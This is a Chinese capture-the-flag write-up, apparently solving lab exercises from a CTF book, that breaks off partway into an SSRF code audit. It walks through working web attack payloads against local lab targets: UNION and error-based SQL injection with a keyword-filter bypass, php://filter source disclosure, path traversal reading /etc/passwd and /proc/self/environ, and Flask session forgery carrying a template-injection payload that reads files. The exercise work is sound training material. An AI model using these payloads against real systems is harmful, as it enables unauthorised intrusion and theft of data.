-<li><p>尝试 UNION 注入，127.0.0.1/index.php?id=-1%27%23union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。</p>
-</li>
-<li><p>尝试获取表明 127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23，得到 fl4g，notes 两个表。</p>
-</li>
-<li><p>分别尝试获取列名。127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23。在 fl4g 中获得 flag。</p>
-</li>
-</ol>
-<h3 id="1-2-2-SQL注入-2"><a href="#1-2-2-SQL注入-2" class="headerlink" title="1.2.2 SQL注入-2"></a>1.2.2 SQL注入-2</h3><ol>
-<li><p>访问 127.0.0.1，服务器返回 Forbidden，说明入口错误。尝试使用 dirsearch 工具扫描目录，发现 login.php、user.php 状态是200，找到入口。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;login.php</span><br><span class="line">403   289B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   290B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">200    11B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;user.php</span><br></pre></td></tr></table></figure></li>
-<li><p>访问 <a href="http://127.0.0.1/login.php">http://127.0.0.1:80/login.php</a> ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：<code>如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦</code></p>
-</li>
-<li><p>安装 burp suit 社区版<br>下载链接：<a href="https://portswigger.net/burp/releases/professional-community-2021-2-1">https://portswigger.net/burp/releases/professional-community-2021-2-1</a><br>安装命令：<code>sh burpsuite_community_linux_v2021_2_1.sh</code> </p>
-</li>
-<li><p>配置 burp suit</p>
-<blockquote>
-<ol>
-<li>进入 Proxy -&gt;  option，选择 add，端口用 8080，选择  Loopback only。</li>
-<li>进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_proxy.png" alt="burp proxy"></li>
-</ol>
-</blockquote>
-</li>
-<li><p>使用 burp suit 抓包、发包。</p>
-<blockquote>
-<p>进入 Proxy -&gt; intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_intercept.png" alt="burp intercept"></p>
-</blockquote>
-</li>
-<li><p>火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。</p>
-</li>
-<li><p>burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 <code>ifconfig</code> 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。</p>
-</li>
-<li><p>burp 捕获访问 <a href="http://172.19.0.1/login.php">http://172.19.0.1/login.php</a> 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：<code>Send to Repeater（Ctrl + R）</code>，再进入 Repeater 页面。在 request 中修改请求头。</p>
-</li>
-<li><p> 根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123’（登录的用户名），成功返回 SQL 报错信息：</p>
-<blockquote>
-<p>string(154) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’123’’’ at line 1”<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_login_request.png" alt="burp login request"></p>
-</blockquote>
-</li>
-<li><p>可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：</p>
-<blockquote>
-<p><code>name=123&#39;or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&amp;pass=123</code></p>
-</blockquote>
-<p>返回报错内容：string(34) “Operand should contain 1 column(s)”</p>
-<p>可能只有1列，尝试 <code>name=123&#39;or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&amp;pass=123</code></p>
-<p>返回报错内容：<code>~7~</code>。确定格式。（0x7e：~ ）</p>
-</li>
-<li><p>使用完整 SQL 语句测试：<code>name=123&#39;or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&amp;pass=123</code>,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息<code>~7~</code>。</p>
-<blockquote>
-<p>string(164) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘from dual)),1)#’’ at line 1”</p>
-</blockquote>
-</li>
-<li><p>通过获取表名，列名成功获得 flag。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) ,0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line"># 返回信息：string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="1-3-任意文件读取漏洞"><a href="#1-3-任意文件读取漏洞" class="headerlink" title="1.3 任意文件读取漏洞"></a>1.3 任意文件读取漏洞</h2><h3 id="1-3-1-afr-1"><a href="#1-3-1-afr-1" class="headerlink" title="1.3.1 afr_1"></a>1.3.1 afr_1</h3><ol>
-<li><p>访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中”病者多诡(HCTF 2016)”，很有可能类似，猜测存在 include 函数，p 可能是 page。</p>
-</li>
-<li><p>使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_1_wappalyzer.png" alt="wappalyzer"></p>
-</li>
-<li><p>使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello</p>
-</li>
-<li><p>于是尝试访问 <code>http://172.19.0.1/index.php</code>，重定向至了<code>http://172.19.0.1/?p=hello</code>，而访问<code>http://172.19.0.1/?p=index</code>则是报错。</p>
-</li>
-<li><p>尝试使用 php 的 filter 获取 index.php,<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index</code>,获得数据<code>PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=</code>，解码后得</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">  include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>清楚了逻辑，直接尝试 <code>flag.php</code>,即<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag</code>,获得数据<code>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</code>，解码得</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
-<p>明显注释中可能表示 flag，查看官方 write up:<code>http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag</code>，确定无错。</p>
-</li>
-<li><p>php://协议 Filter解读： <code>?p=php://filter/read=convert.Base64-encode/resource=flag</code></p>
-<ul>
-<li>这是 p 关键字得 get 传递，即p=****</li>
-<li>php://是一种协议名称，php://filter/ 是一种访问本地文件的协议</li>
-<li>read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签</li>
-<li>/resource=flag 表示目标文件是 flag.php</li>
-</ul>
-</li>
-</ol>
-<h3 id="1-3-2-afr-2"><a href="#1-3-2-afr-2" class="headerlink" title="1.3.2 afr_2"></a>1.3.2 afr_2</h3><ol>
-<li>访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_2_wappalyzer.png" alt="wappalyzer"></li>
-<li>使用 dirsearch 进行目录扫描，发现<code>/img</code>目录可以直接访问<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">301   194B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;img    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;172.19.0.1&#x2F;img&#x2F;</span><br><span class="line">200    99B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
-<li>想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径<code>/img../</code>，获得 flag。</li>
-</ol>
-<h3 id="1-3-3-afr-3"><a href="#1-3-3-afr-3" class="headerlink" title="1.3.3 afr_3"></a>1.3.3 afr_3</h3><ul>
-<li>【知识点】:<ul>
-<li>任意文件读取</li>
-<li>flask SSTI 模板注入<ul>
-<li><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></li>
-</ul>
-</li>
-<li>session 伪造<ul>
-<li><a href="https://blog.csdn.net/DonkeyMoon/article/details/109690476">flask session 伪造</a></li>
-<li><a href="https://blog.csdn.net/rfrder/article/details/109188719">[HCTF 2018]admin 1</a></li>
-<li><a href="https://blog.csdn.net/SopRomeo/article/details/111186821?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328680.24088.16162219708244293&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">N1BOOK 入门session伪造</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li><p><code>172.19.0.1:5000</code> 访问本题环境，在 <code>your name</code>框键入<code>test</code>，点<code>提交</code>。</p>
-</li>
-<li><p>跳转到了<code>http://172.19.0.1:5000/n1page</code>,并且页面显示：<code>Hello : test, why you don&#39;t look at our article?</code>，点击 <code>article</code> 跳转到了<code>http://172.19.0.1:5000/article?name=article</code></p>
-</li>
-<li><p>注意到 url 中有参数 name,<code>name=article</code>,尝试随意赋值 name，页面回显：<code>[Errno 2] No such file or directory: &#39;/home/nu11111111l/articles/article1&#39;</code>，获得路径信息，并且很有可能是 linux 服务器，其实在 wappalyzer 中有检测出是 ubuntu</p>
-</li>
-<li><p>尝试文件读取漏洞中常见的读取路径。先尝试 <code>/etc/passwd</code>，即<code>http://172.19.0.1:5000/article?name=/../../../etc/passwd</code>,成功回显<code>passwd</code>文件信息。研究了下 linux 的 passwd，没发现特殊的信息，继续尝试其他路径。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash </span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync </span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">messagebus:x:101:101::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure></li>
-<li><p>尝试 <code>/proc/self/cmdline</code>,，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cmdline</code>，获得回显信息：<code>pythonserver.py</code>,获得题目是 python 的服务器。</p>
-</li>
-<li><p>尝试在 <code>environ</code> 查看环境变量，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/environ</code>,获得环境变量,得知<code>server.py</code> 在 <code>/home/sssssserver</code>路径下。</p>
-<blockquote>
-<p>HOSTNAME=c0b8f0d6cb78HOME=/rootPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/home/sssssserver</p>
-</blockquote>
-</li>
-<li><p>直接访问<code>server.py</code>，即<code>http://172.19.0.1:5000/article?name=/../../../home/sssssserver/server.py</code>,成功回显 <code>server.py</code> 源码。（server.py 可以通过<code>/proc/self/cwd</code>进入当前应用所在目录直接获得，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cwd/server.py</code>）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, render_template, request, url_for, redirect, session, render_template_string)</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execfile() 函数可以用来执行一个文件。</span></span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line">FLAG = flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在flask项目中，Session, Cookies以及一些第三方扩展都会用到SECRET_KEY值，这是一个比较重要的配置值。</span></span><br><span class="line">app.secret_key = key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 host/n1page 时会进入此方法</span></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">	<span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line">	n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 过滤</span></span><br><span class="line">	<span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line"></span><br><span class="line">	template = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">			&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">			Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">			 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">return</span> render_template_string(template) @ app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">	error = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">    	page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">    	page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">		page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    	template = e</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
-<li><p>在 pycharm 中搭建环境，通过阅读源码知目录下有 <code>flag.py</code>，直接访问发现没有权限。继续阅读源码，发现<code>n1page</code>方法中存在模板注入，但是存在过滤</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>  不过在接下来的对 session[<code>n1code</code>] 仅仅是简单判定是否为空，可以利用 falsk 的 session 伪造实现注入。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">	&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">	Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">	 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<ol start="9">
-<li><p>首先通过代码的逻辑，程序进入<code>n1page</code>方法，也就是访问<code>host/n1page</code>的时候，所以应该是抓访问<code>http://172.19.0.1:5000/n1page</code>的包。<br><img src="wp_afr3_n1page_session.png" alt="afr3"></p>
-</li>
-<li><p>获取这个包的 session，然后使用解码函数解密，确定 session 字符串形式<code>&#123;&#39;n1code&#39;: None&#125;</code>，需要构造 payload 去替换 none。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 由于我是在 pycharm 运行，为了方便直接将 session 赋值给 payload</span></span><br><span class="line">    payload = <span class="string">&quot;eyJuMWNvZGUiOm51bGx9.YFVHSw.M_DdKDNd7WMbknyVKSDJ9Y25Z7Q&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(payload.encode()))</span><br><span class="line">    <span class="comment"># print(decryption(sys.argv[1].encode())) </span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>{‘n1code’: None}</p>
-</blockquote>
-</li>
-<li><p>flask的 session 伪造需要一个密钥。接下来需要获得<code>SECRET_KEY</code>。在 server.py 源码中有执行 key.py 文件的操作，即<code>execfile(&#39;key.py&#39;)</code>，所以尝试直接访问<code>key.py</code>，成功获得内容：#!/usr/bin/python key = ‘Drmhze6EPcv0fN_81Bj-nA’</p>
-</li>
-<li><p>接下来是构造 payload。使用知识点中列的博文里的 payload 很多都失败了，我最终成功的形式：<code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code>，使用<code>flask-session-cookie-manager</code>完整的命令形式：<code>python3 flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#39;n1code&#39; : &#39;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code></p>
-</li>
-</ol>
-<ul>
-<li>flask-session-cookie-manager：Flask Session Cookie Decoder/Encoder，可以用来对 flask session cookie 编码/解码，实际上第10步也可以用这个来解码</li>
-<li><code>Drmhze6EPcv0fN_81Bj-nA</code>，从 key.py 中获得的密钥</li>
-<li>整个流程：1. 先对原始 session 解码获得 session 的形式  2. 获取<code>SECRET_KEY</code>  3. 构造 payload  4. 按照解码获得 session 的形式构造 session，再通过<code>flask-session-cookie-manager</code>使用 key 加密编码。</li>
-</ul>
-<ol start="13">
-<li>将<code>flask-session-cookie-manager</code>获得的编码放到请求包的 session 中，再向服务器发送该包，成功获得 flag.py<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_3_flag.png" alt="afr"></li>
-</ol>
-<h1 id="第二章-Web-进阶"><a href="#第二章-Web-进阶" class="headerlink" title="第二章 Web 进阶"></a>第二章 Web 进阶</h1><h2 id="2-1-SSRF漏洞"><a href="#2-1-SSRF漏洞" class="headerlink" title="2.1 SSRF漏洞"></a>2.1 SSRF漏洞</h2><ol>
-<li><p> 进入环境，点击 intersting challenge，代码审计。更详细的代码审计可以看这篇<a href="https://blog.csdn.net/wuyaowangchuan/article/details/110433971">博客</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  <span class="comment"># 高亮显示当前文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="comment">// ^ 匹配行的开始</span></span><br><span class="line">    <span class="comment">// (xyz) 字符组，按照确切的顺序匹配字符 xyz</span></span><br><span class="line">    <span class="comment">// | 分支结构，匹配符号之前的字符或后面的字符</span></span><br><span class="line">    <span class="comment">// ? 	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符</span></span><br><span class="line">    <span class="comment">// \ 转义符，它可以还原元字符原来的含义，允许你匹配保留字符 [ ] ( ) &#123; 